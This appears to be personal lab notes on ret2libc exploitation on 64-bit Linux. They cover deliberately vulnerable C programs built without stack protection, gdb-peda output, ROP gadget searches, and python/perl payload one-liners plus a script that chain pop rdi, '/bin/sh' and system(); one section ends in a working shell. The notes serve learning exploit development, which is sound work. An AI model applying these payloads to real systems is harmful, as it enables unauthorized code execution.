

## Working ret2libc

* https://github.com/hugsy/gef
* https://github.com/pwndbg/pwndbg
* https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf
* peda - https://github.com/longld/peda
* https://www.coresecurity.com/sites/default/private-files/publications/2016/05/corelabs-Agafi_-_Ekoparty.pdf
* https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/
* https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/
* https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/
* https://www.tiandiwuji.top/posts/32791/
* https://github.com/sashs/Ropper
* https://github.com/hugsy/gef


```shell

using read bug 

bug2.c

#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    char buf[80];
    int r;
    r = read(0, buf, 400);
    printf("\nRead %d bytes. buf is %s\n", r, buf);
    puts("No shell for you :(");
    return 0;
}

gcc -no-pie -fno-stack-protector bug2.c -o bug2

python -c "print 'A' * 96 + 'B' * 8 + 'C' * 8" > temp


gdb-peda$ r < temp
Starting program: /home/lasalle/workspaces19/vuln3/bug2 < temp

Read 113 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq
No shell for you :(

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7af4154 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dd18c0 --> 0x0 
RSI: 0x602260 ("No shell for you :(\nis ", 'A' <repeats 92 times>, "q\n")
RDI: 0x1 
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffdfb8 ("CCCCCCCC\n")
RIP: 0x4005cb (<main+84>:	ret)
R8 : 0x7ffff7fde4c0 (0x00007ffff7fde4c0)
R9 : 0x5d (']')
R10: 0x3 
R11: 0x246 
R12: 0x400490 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe090 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4005c0 <main+73>:	call   0x400460 <puts@plt>
   0x4005c5 <main+78>:	mov    eax,0x0
   0x4005ca <main+83>:	leave  
=> 0x4005cb <main+84>:	ret    
   0x4005cc:	nop    DWORD PTR [rax+0x0]
   0x4005d0 <__libc_csu_init>:	push   r15
   0x4005d2 <__libc_csu_init+2>:	push   r14
   0x4005d4 <__libc_csu_init+4>:	mov    r15,rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfb8 ("CCCCCCCC\n")
0008| 0x7fffffffdfc0 --> 0xa ('\n')
0016| 0x7fffffffdfc8 --> 0x7fffffffe098 --> 0x7fffffffe3c2 ("/home/lasalle/workspaces19/vuln3/bug2")
0024| 0x7fffffffdfd0 --> 0x100008000 
0032| 0x7fffffffdfd8 --> 0x400577 (<main>:	push   rbp)
0040| 0x7fffffffdfe0 --> 0x0 
0048| 0x7fffffffdfe8 --> 0x1e772d66714dc8ca 
0056| 0x7fffffffdff0 --> 0x400490 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004005cb in main ()
gdb-peda$ 

python -c "print 'A' * 96 + 'B' * 8 + 'C' * 8" > temp

gdb-peda$ p execve
$1 = {<text variable, no debug info>} 0x7ffff7ac8e30 <execve>
gdb-peda$ 


python -c "print 'A' * 96 + 'B' * 8 + '\x30\x8e\xac\xf7\xff\x7f\x00\x00'" > temp

b *main+32

python -c "print 'A' * 96 + 'B' * 8 + 'C' * 64" > temp

=> 0x4005cb <main+84>:	ret

b *main+84

ret is pop rip

ret Pop return address from stack and jump there 

https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf

pop execve address and jump

python -c "print 'A' * 96 + 'B' * 8 + '\x30\x8e\xac\xf7\xff\x7f\x00\x00'" > temp

gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x00400633 : (b'5fc3')	pop rdi; ret

python -c "print 'A' * 96 + 'B' * 8 + '\x33\x06\x40\x00\x00\x00\x00\x00'" > temp

[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfb8 --> 0x400633 (<__libc_csu_init+99>:	pop    rdi)
0008| 0x7fffffffdfc0 --> 0xa ('\n')

python -c "print 'A' * 96 + 'B' * 8 + '\x33\x06\x40\x00\x00\x00\x00\x00'" > temp

python -c "print 'A' * 96 + 'B' * 8 + '\x33\x06\x40\x00\x00\x00\x00\x00' + 'C' * 8 " > temp

[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfb8 --> 0x400633 (<__libc_csu_init+99>:	pop    rdi)
0008| 0x7fffffffdfc0 ("CCCCCCCC\n\340\377\377\377\177")

python -c "print 'A' * 96 + 'B' * 8 + '\x33\x06\x40\x00\x00\x00\x00\x00' + '\x9a\x7e\xb9\xf7\xff\x7f\x00\x00' " > temp

gdb-peda$ find '/bin/sh'
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')

gdb-peda$ 

[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfb8 --> 0x400633 (<__libc_csu_init+99>:	pop    rdi)
0008| 0x7fffffffdfc0 --> 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')
0016| 0x7fffffffdfc8 --> 0x7fffffffe00a --> 0x99a6000000000000 


$ cat execve.s 
section .rodata
    sh: db '/bin/sh'

section .text
        global main
        extern execve
    main:
        ; execve('/bin/sh', NULL, NULL)
        mov rdi, sh
        mov rsi, 0
        mov rax, 0
        call execve

        ; return 0
        mov rax, 0
        ret


gdb-peda$ ropsearch "pop rsi"
Searching for ROP gadget: 'pop rsi' in: binary ranges
0x00400631 : (b'5e415fc3')	pop rsi; pop r15; ret
gdb-peda$ 

python -c "print 'A' * 96 + 'B' * 8 + '\x33\x06\x40\x00\x00\x00\x00\x00' + '\x9a\x7e\xb9\xf7\xff\x7f\x00\x00' + '\x31\x06\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' " > temp

gdb-peda$ p execve
$2 = {<text variable, no debug info>} 0x7ffff7ac8e30 <execve>

python -c "print 'A' * 96 + 'B' * 8 + '\x33\x06\x40\x00\x00\x00\x00\x00' + '\x9a\x7e\xb9\xf7\xff\x7f\x00\x00' + '\x31\x06\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x30\x8e\xac\xf7\xff\x7f\x00\x00'" > temp

Legend: code, data, rodata, value
0x00007ffff7ac8e35	78	in ../sysdeps/unix/syscall-template.S
gdb-peda$ si
process 12957 is executing new program: /bin/dash
Error in re-setting breakpoint 5: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 5: No symbol "main" in current context.
Error in re-setting breakpoint 5: No symbol "main" in current context.
Error in re-setting breakpoint 5: No symbol "main" in current context.
[Inferior 1 (process 12957) exited normally]


(cat temp;cat) | ./bug2

https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf

lasalle@lasalle-VirtualBox:~/workspaces19/vuln3$ (cat temp;cat) | ./bug2

Read 153 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
No shell for you :(
whoami
lasalle

```

## Notes on trial/testing - working sample is above
```
http://shellblade.net/docs/ret2libc.pdf

#include <stdio.h>
void foo(int x)
{
int y;
x++;
y = 4;
}
int main(void)
{
foo(2);
return 0;
}

gef➤  disas main
Dump of assembler code for function main:
   0x000000000000060f <+0>:	push   rbp
   0x0000000000000610 <+1>:	mov    rbp,rsp
   0x0000000000000613 <+4>:	mov    edi,0x2
   0x0000000000000618 <+9>:	call   0x5fa <foo>
   0x000000000000061d <+14>:	mov    eax,0x0
   0x0000000000000622 <+19>:	pop    rbp
   0x0000000000000623 <+20>:	ret    
End of assembler dump.


$ cat $HOME/.gdbinit
source /home/lasalle/.gdbinit-gef.py

echo "set disas intel" >> $HOME/.gdbinit

gef➤  disas main
Dump of assembler code for function main:
   0x000000000000060f <+0>:	push   rbp
   0x0000000000000610 <+1>:	mov    rbp,rsp
   0x0000000000000613 <+4>:	mov    edi,0x2
   0x0000000000000618 <+9>:	call   0x5fa <foo>
   0x000000000000061d <+14>:	mov    eax,0x0
   0x0000000000000622 <+19>:	pop    rbp
   0x0000000000000623 <+20>:	ret    
End of assembler dump.

ef➤  disas foo
Dump of assembler code for function foo:
   0x00000000000005fa <+0>:	push   rbp
   0x00000000000005fb <+1>:	mov    rbp,rsp
   0x00000000000005fe <+4>:	mov    DWORD PTR [rbp-0x14],edi
   0x0000000000000601 <+7>:	add    DWORD PTR [rbp-0x14],0x1
   0x0000000000000605 <+11>:	mov    DWORD PTR [rbp-0x4],0x4
   0x000000000000060c <+18>:	nop
   0x000000000000060d <+19>:	pop    rbp
   0x000000000000060e <+20>:	ret    
End of assembler dump.


gef➤  p system
$1 = {int (const char *)} 0x7ffff7a33440 <__libc_system>


gef➤  p exit
$2 = {void (int)} 0x7ffff7a27120 <__GI_exit>

$ ./setup
Estimated address: 0x7ffefbd9de86

gef➤  p system
$1 = {int (const char *)} 0x7ffff7a33440 <__libc_system>
gef➤  p exit
$2 = {void (int)} 0x7ffff7a27120 <__GI_exit>
gef➤  

 x/4s 0x7ffefbd9de86

0x7fffffffea21

gcc -fno-stack-protector setup.c -o setup

Estimated address: 0x7ffe0b533e86

 x/4s 0x7ffe0b533e86

64-bit Linux stack smashing tutorial: Part 1
https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/

64-bit Linux stack smashing tutorial: Part 2
https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/

64-bit Linux stack smashing tutorial: Part 3
https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/

install Ropper - https://github.com/sashs/Ropper

install filebytes - https://github.com/sashs/filebytes

sudo -H pip install keystone-engine

$ cat /proc/sys/kernel/randomize_va_space
2

ropper --file bug --search "% ?di"
0x0000000000000783: pop rdi; ret; 

0x0000000000000783  # pop rdi; ret;

$ cat ~/.gdbinit
source /home/lasalle/.gdbinit-gef.py
set disas intel
source ~/peda/peda.py

$ cat ~/.gdbinit
source ~/peda/peda.py

gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
ret2libc : 0x55555555480f --> 0x68732f6e69622f ('/bin/sh')
ret2libc : 0x55555575480f --> 0x68732f6e69622f ('/bin/sh')
    libc : 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ 

0x55480f  --> /bin/sh string

$ ropper --file ret2libc --search "% ?di"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % ?di

[INFO] File: ret2libc
0x0000000000000700: call 0x590; lea rdi, [rip + 0xe3]; call 0x580; mov eax, 0; leave; ret; 
0x0000000000000706: lea edi, [rip + 0xe3]; call 0x580; mov eax, 0; leave; ret; 
0x0000000000000705: lea rdi, [rip + 0xe3]; call 0x580; mov eax, 0; leave; ret; 
0x00000000000007b3: pop rdi; ret; 

0x00000000000007b3 --> pop rdi

gdb-peda$ p system
$2 = {int (const char *)} 0x7ffff7a33440 <__libc_system>

0x7ffff7a33440 --> system()

gcc -no-pie -fno-stack-protector ret2libc.c -o ret2libc

b4551k5  Christoph Groß • a year ago
It seems that gcc build PIE (position indep. exec.). You can check this using "readelf -e <executable>". If at the top (the header), Type is "DYN (shared..." then it is PIE and gets loaded at random base address. You can rebuild the code using "-no-pie" as compile flag to tell the linker you want to build an executable. This should result in 0x400000 as base address as in the examples above.

gdb-peda$ p system
$2 = {int (const char *)} 0x7ffff7a33440 <__libc_system>

lasalle@lasalle-VirtualBox:~/workspaces19/ret2libc$ ropper --file ret2libc --search "% ?di"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % ?di

[INFO] File: ret2libc
0x00000000004004e4: add byte ptr [rax], al; test rax, rax; je 0x4f8; pop rbp; mov edi, 0x601040; jmp rax; 
0x0000000000400526: add byte ptr [rax], al; test rax, rax; je 0x538; pop rbp; mov edi, 0x601040; jmp rax; 
0x00000000004005ad: call 0x470; lea rdi, [rip + 0xe6]; call 0x460; mov eax, 0; leave; ret; 
0x00000000004004e9: je 0x4f8; pop rbp; mov edi, 0x601040; jmp rax; 
0x000000000040052b: je 0x538; pop rbp; mov edi, 0x601040; jmp rax; 
0x00000000004005b3: lea edi, [rip + 0xe6]; call 0x460; mov eax, 0; leave; ret; 
0x00000000004005b2: lea rdi, [rip + 0xe6]; call 0x460; mov eax, 0; leave; ret; 
0x00000000004004ec: mov edi, 0x601040; jmp rax; 
0x00000000004005ae: mov esi, 0x48fffffe; lea edi, [rip + 0xe6]; call 0x460; mov eax, 0; leave; ret; 
0x00000000004004eb: pop rbp; mov edi, 0x601040; jmp rax; 
0x0000000000400663: pop rdi; ret; 

gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
ret2libc : 0x4006bf --> 0x68732f6e69622f ('/bin/sh')
ret2libc : 0x6006bf --> 0x68732f6e69622f ('/bin/sh')
    libc : 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')


bug.py
#!/usr/bin/env python

from struct import *

buf = ""
buf += "A"*104                              # junk
buf += pack("<Q", 0x0000000000400663)       # pop rdi; ret;
buf += pack("<Q", 0x4006bf)                 # pointer to "/bin/sh" gets popped into rdi
buf += pack("<Q", 0x7ffff7a33440)           # address of system()

f = open("in.txt", "w")
f.write(buf)


gdb-peda$ br *vuln+77
Breakpoint 1 at 0x4005c4
gdb-peda$ r < in.txt


Stuck with this issue

EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7a332e6 <do_system+1078>:	movq   xmm0,QWORD PTR [rsp+0x8]
   0x7ffff7a332ec <do_system+1084>:	mov    QWORD PTR [rsp+0x8],rax
   0x7ffff7a332f1 <do_system+1089>:	movhps xmm0,QWORD PTR [rsp+0x8]
=> 0x7ffff7a332f6 <do_system+1094>:	movaps XMMWORD PTR [rsp+0x40],xmm0
   0x7ffff7a332fb <do_system+1099>:	call   0x7ffff7a23110 <__GI___sigaction>
   0x7ffff7a33300 <do_system+1104>:	lea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 <quit>
   0x7ffff7a33307 <do_system+1111>:	xor    edx,edx
   0x7ffff7a33309 <do_system+1113>:	mov    edi,0x3

```

## bug.c using ropper and gdb-peda and -no-pie 

```

Going back to try bug.c using ropper and gdb-peda and -no-pie (to get address of system properly)

http://shellblade.net/docs/ret2libc.pdf
https://github.com/superkojiman/dc416-exploitdev-intro/blob/master/x64-asm-cheatsheet.pdf

#include <stdio.h>
#include <string.h>
void bug(char *arg1)
{
 char name[128];
 strcpy(name, arg1);
 printf("Hello %s\n", name);
}
int main(int argc, char **argv)
{
 if (argc < 2)
 {
 printf("Usage: %s <your name>\n", argv[0]);
 return 0;
 }
 bug(argv[1]);
 return 0;
}


gcc -no-pie -fno-stack-protector bug.c -o bug

gdb-peda$ disas bug
Dump of assembler code for function bug:
   0x0000000000400537 <+0>:	push   rbp
   0x0000000000400538 <+1>:	mov    rbp,rsp
   0x000000000040053b <+4>:	sub    rsp,0x90
   0x0000000000400542 <+11>:	mov    QWORD PTR [rbp-0x88],rdi
   0x0000000000400549 <+18>:	mov    rdx,QWORD PTR [rbp-0x88]
   0x0000000000400550 <+25>:	lea    rax,[rbp-0x80]
   0x0000000000400554 <+29>:	mov    rsi,rdx
   0x0000000000400557 <+32>:	mov    rdi,rax
   0x000000000040055a <+35>:	call   0x400430 <strcpy@plt>
   0x000000000040055f <+40>:	lea    rax,[rbp-0x80]
   0x0000000000400563 <+44>:	mov    rsi,rax
   0x0000000000400566 <+47>:	lea    rdi,[rip+0xe7]        # 0x400654
   0x000000000040056d <+54>:	mov    eax,0x0
   0x0000000000400572 <+59>:	call   0x400440 <printf@plt>
   0x0000000000400577 <+64>:	nop
   0x0000000000400578 <+65>:	leave  
   0x0000000000400579 <+66>:	ret    
End of assembler dump.


r `perl -e 'print "A"x144'`


RBP: 0x7fffffffdf00 (0x00007fffffffdf00)
RSP: 0x7fffffffdf08 --> 0x4005c4 (<main+74>:	mov    eax,0x0)
RIP: 0x400579 (<bug+66>:	ret)


cheat sheet https://github.com/superkojiman/dc416-exploitdev-intro

https://github.com/superkojiman/dc416-exploitdev-intro/blob/master/x64-asm-cheatsheet.pdf 

ret --> pop rip

current rip --> RIP: 0x400579 (<bug+66>:	ret)

value on the stack --> 0000| 0x7fffffffdf08 --> 0x4005c4 (<main+74>:	mov    eax,0x0)

it will go back to main

after si

register
RIP: 0x4005c4 (<main+74>:	mov    eax,0x0)

stack 
0000| 0x7fffffffdf10 --> 0x7fffffffe008 --> 0x7fffffffe339 ("/home/lasalle/workspaces19/ret2libc/bug")

r `perl -e 'print "A"x128'`


RBP: 0x7fffffffdf00 (0x00007fffffffdf00)  - base pointer of stack - 8 bytes
RSP: 0x7fffffffdf08 --> 0x4005c4 (<main+74>:	mov    eax,0x0) - to pop in rip by ret

b *bug+66
r `perl -e 'print "A"x128,"B"x4'` --> plus 8 bytes - will go to RBP

register 
RBP: 0x7f0042424242  --> base pointer of stack is overwritten
RSP: 0x7fffffffdf08 --> 0x4005c4 (<main+74>:	mov    eax,0x0)  --> still points to main
RIP: 0x400579 (<bug+66>:	ret)  ---> current instruction

[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf08 --> 0x4005c4 (<main+74>:	mov    eax,0x0)
0008| 0x7fffffffdf10 --> 0x7fffffffe008 --> 0x7fffffffe335 ("/home/lasalle/workspaces19/ret2libc/bug")
0016| 0x7fffffffdf18 --> 0x200000000 

if RBP is messed up, it iwll still break. so putting the RIP to jump somewhere will continue the process


gdb-peda$ r `perl -e 'print "A"x128,"B"x8'`

RBP is overwritten

RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffdf08 --> 0x400500 (<__do_global_dtors_aux>:	cmp    BYTE PTR [rip+0x200b31],0x0        # 0x601038 <completed.7697>)
RIP: 0x400579 (<bug+66>:	ret)


[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf08 --> 0x400500 (<__do_global_dtors_aux>:	cmp    BYTE PTR [rip+0x200b31],0x0        # 0x601038 <completed.7697>)
0008| 0x7fffffffdf10 --> 0x7fffffffe008 --> 0x7fffffffe331 ("/home/lasalle/workspaces19/ret2libc/bug")
0016| 0x7fffffffdf18 --> 0x200000000 

[-------------------------------------code-------------------------------------]
   0x400572 <bug+59>:	call   0x400440 <printf@plt>
   0x400577 <bug+64>:	nop
   0x400578 <bug+65>:	leave  
=> 0x400579 <bug+66>:	ret    
   0x40057a <main>:	push   rbp
   0x40057b <main+1>:	mov    rbp,rsp
   0x40057e <main+4>:	sub    rsp,0x10
   0x400582 <main+8>:	mov    DWORD PTR [rbp-0x4],edi

c

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x601038 --> 0x1 
RBX: 0x0 
RCX: 0x0 
RDX: 0x0 
RSI: 0x602260 ("Hello ", 'A' <repeats 128 times>, "BBBBBBBB\n")
RDI: 0x1 
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffdf18 --> 0x200000000 
RIP: 0x7fffffffe008 --> 0x7fffffffe331 ("/home/lasalle/workspaces19/ret2libc/bug")
R8 : 0x0 
R9 : 0x88 
R10: 0xffffff78 
R11: 0x246 
R12: 0x400450 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe000 --> 0x2 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7fffffffe002:	add    BYTE PTR [rax],al
   0x7fffffffe004:	add    BYTE PTR [rax],al
   0x7fffffffe006:	add    BYTE PTR [rax],al
=> 0x7fffffffe008:	xor    ebx,esp
   0x7fffffffe00a:	(bad)  
   0x7fffffffe00b:	(bad)  
   0x7fffffffe00c:	(bad)  
   0x7fffffffe00d:	jg     0x7fffffffe00f
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf18 --> 0x200000000 
0008| 0x7fffffffdf20 --> 0x4005d0 (<__libc_csu_init>:	push   r15)
0016| 0x7fffffffdf28 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0024| 0x7fffffffdf30 --> 0x2 
0032| 0x7fffffffdf38 --> 0x7fffffffe008 --> 0x7fffffffe331 ("/home/lasalle/workspaces19/ret2libc/bug")
0040| 0x7fffffffdf40 --> 0x200008000 
0048| 0x7fffffffdf48 --> 0x40057a (<main>:	push   rbp)
0056| 0x7fffffffdf50 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007fffffffe008 in ?? ()
gdb-peda$ 


gdb-peda$ p system
$1 = {int (const char *)} 0x7ffff7a33440 <__libc_system>
gdb-peda$ 

jump to system

gdb-peda$ r `perl -e 'print "A"x128,"B"x8'`

gdb-peda$ p system
$3 = {int (const char *)} 0x7ffff7a33440 <__libc_system>
gdb-peda$ p exit
$4 = {void (int)} 0x7ffff7a27120 <__GI_exit>
gdb-peda$ 

gdb-peda$ r `perl -e 'print "A"x128,"B"x8,"\x40\x34\xa3\xf7\xff\x7f"'`

[----------------------------------registers-----------------------------------]
RAX: 0x95 
RBX: 0x0 
RCX: 0x0 
RDX: 0x0 
RSI: 0x602260 ("Hello ", 'A' <repeats 128 times>, "BBBBBBBB@4\243\367\377\177\n")
RDI: 0x1 
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffdef8 --> 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
RIP: 0x400579 (<bug+66>:	ret)
R8 : 0x0 
R9 : 0x8e 
R10: 0xffffff72 
R11: 0x246 
R12: 0x400450 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdff0 --> 0x2 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400572 <bug+59>:	call   0x400440 <printf@plt>
   0x400577 <bug+64>:	nop
   0x400578 <bug+65>:	leave  
=> 0x400579 <bug+66>:	ret    
   0x40057a <main>:	push   rbp
   0x40057b <main+1>:	mov    rbp,rsp
   0x40057e <main+4>:	sub    rsp,0x10
   0x400582 <main+8>:	mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdef8 --> 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
0008| 0x7fffffffdf00 --> 0x7fffffffdff8 --> 0x7fffffffe32b ("/home/lasalle/workspaces19/ret2libc/bug")
0016| 0x7fffffffdf08 --> 0x200000000 
0024| 0x7fffffffdf10 --> 0x4005d0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffdf18 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0040| 0x7fffffffdf20 --> 0x2 
0048| 0x7fffffffdf28 --> 0x7fffffffdff8 --> 0x7fffffffe32b ("/home/lasalle/workspaces19/ret2libc/bug")
0056| 0x7fffffffdf30 --> 0x200008000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400579 in bug ()


gdb-peda$ si

[----------------------------------registers-----------------------------------]
RAX: 0x95 
RBX: 0x0 
RCX: 0x0 
RDX: 0x0 
RSI: 0x602260 ("Hello ", 'A' <repeats 128 times>, "BBBBBBBB@4\243\367\377\177\n")
RDI: 0x1 
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffdf00 --> 0x7fffffffdff8 --> 0x7fffffffe32b ("/home/lasalle/workspaces19/ret2libc/bug")
RIP: 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
R8 : 0x0 
R9 : 0x8e 
R10: 0xffffff72 
R11: 0x246 
R12: 0x400450 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdff0 --> 0x2 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7a33439 <cancel_handler+217>:	pop    rbx
   0x7ffff7a3343a <cancel_handler+218>:	ret    
   0x7ffff7a3343b:	nop    DWORD PTR [rax+rax*1+0x0]
=> 0x7ffff7a33440 <__libc_system>:	test   rdi,rdi
   0x7ffff7a33443 <__libc_system+3>:	je     0x7ffff7a33450 <__libc_system+16>
   0x7ffff7a33445 <__libc_system+5>:	jmp    0x7ffff7a32eb0 <do_system>
   0x7ffff7a3344a <__libc_system+10>:	nop    WORD PTR [rax+rax*1+0x0]
   0x7ffff7a33450 <__libc_system+16>:	lea    rdi,[rip+0x164a4b]        # 0x7ffff7b97ea2
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf00 --> 0x7fffffffdff8 --> 0x7fffffffe32b ("/home/lasalle/workspaces19/ret2libc/bug")
0008| 0x7fffffffdf08 --> 0x200000000 
0016| 0x7fffffffdf10 --> 0x4005d0 (<__libc_csu_init>:	push   r15)
0024| 0x7fffffffdf18 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0032| 0x7fffffffdf20 --> 0x2 
0040| 0x7fffffffdf28 --> 0x7fffffffdff8 --> 0x7fffffffe32b ("/home/lasalle/workspaces19/ret2libc/bug")
0048| 0x7fffffffdf30 --> 0x200008000 
0056| 0x7fffffffdf38 --> 0x40057a (<main>:	push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
__libc_system (line=0x1 <error: Cannot access memory at address 0x1>) at ../sysdeps/posix/system.c:180
180	../sysdeps/posix/system.c: No such file or directory.
gdb-peda$ 

cannot access 0x1 in system. could be that it is expecting the exit address


gdb-peda$ p system
$3 = {int (const char *)} 0x7ffff7a33440 <__libc_system>
gdb-peda$ p exit
$4 = {void (int)} 0x7ffff7a27120 <__GI_exit>
gdb-peda$ 

gdb-peda$ r `perl -e 'print "A"x128,"B"x8,"\x40\x34\xa3\xf7\xff\x7f","\x20\x71\xa2\xf7\xff\x7f"'`

"\x20\x71\xa2\xf7\xff\x7f"

gdb-peda$ r `perl -e 'print "A"x128,"B"x8,"\x40\x34\xa3\xf7\xff\x7f","\x20\x71\xa2\xf7\xff\x7f"'`
Starting program: /home/lasalle/workspaces19/ret2libc/bug `perl -e 'print "A"x128,"B"x8,"\x40\x34\xa3\xf7\xff\x7f","\x20\x71\xa2\xf7\xff\x7f"'`
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB@4���

[----------------------------------registers-----------------------------------]
RAX: 0x95 
RBX: 0x0 
RCX: 0x0 
RDX: 0x0 
RSI: 0x602260 ("Hello ", 'A' <repeats 128 times>, "BBBBBBBB@4\243\367\377\177\n")
RDI: 0x1 
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffdee8 --> 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
RIP: 0x400579 (<bug+66>:	ret)
R8 : 0x0 
R9 : 0x8e 
R10: 0xffffff72 
R11: 0x246 
R12: 0x400450 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdfe0 --> 0x3 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400572 <bug+59>:	call   0x400440 <printf@plt>
   0x400577 <bug+64>:	nop
   0x400578 <bug+65>:	leave  
=> 0x400579 <bug+66>:	ret    
   0x40057a <main>:	push   rbp
   0x40057b <main+1>:	mov    rbp,rsp
   0x40057e <main+4>:	sub    rsp,0x10
   0x400582 <main+8>:	mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdee8 --> 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
0008| 0x7fffffffdef0 --> 0x7fffffffdfe8 --> 0x7fffffffe325 ("/home/lasalle/workspaces19/ret2libc/bug")
0016| 0x7fffffffdef8 --> 0x300000000 
0024| 0x7fffffffdf00 --> 0x4005d0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffdf08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0040| 0x7fffffffdf10 --> 0x3 
0048| 0x7fffffffdf18 --> 0x7fffffffdfe8 --> 0x7fffffffe325 ("/home/lasalle/workspaces19/ret2libc/bug")
0056| 0x7fffffffdf20 --> 0x300008000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400579 in bug ()

